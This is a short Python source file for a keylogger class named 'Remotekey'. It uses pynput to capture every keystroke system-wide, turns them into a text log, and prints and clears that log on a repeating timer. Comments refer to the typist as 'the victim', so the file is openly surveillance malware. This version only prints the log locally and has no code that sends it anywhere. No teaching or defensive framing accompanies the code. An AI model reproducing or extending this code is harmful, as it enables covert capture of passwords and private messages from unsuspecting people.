import pynput.keyboard
import threading


class Remotekey:
    # constructor
    def __init__(self, time_interval):
        self.log_key_press = ""
        # time interval for writing the keystrokes
        self.interval = time_interval

    # storing each keystroke
    def store_key_press(self, string):
        self.log_key_press = self.log_key_press + string

    def get_key_press(self, key):
        try:
            current_key_press = str(key.char)
        except AttributeError:
            # when the victim presses the space bar it gets replaced by an empty space
            if key == key.space:
                current_key_press = " "
            # else write as normal character with empty space at the beginning and at the end
            else:
                current_key_press = " " + str(key) + " "
        self.store_key_press(current_key_press)

    # creating a threat to accommodate the timer function
    def get_report(self):
        print(self.log_key_press)
        # clear the log file
        self.log_key_press = ""
        # recursive function - calling it self
        timer = threading.Timer(self.interval, self.get_report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.get_key_press)
        with keyboard_listener:
            # get the report in "intervals" of 5 seconds
            self.get_report()
            keyboard_listener.join()
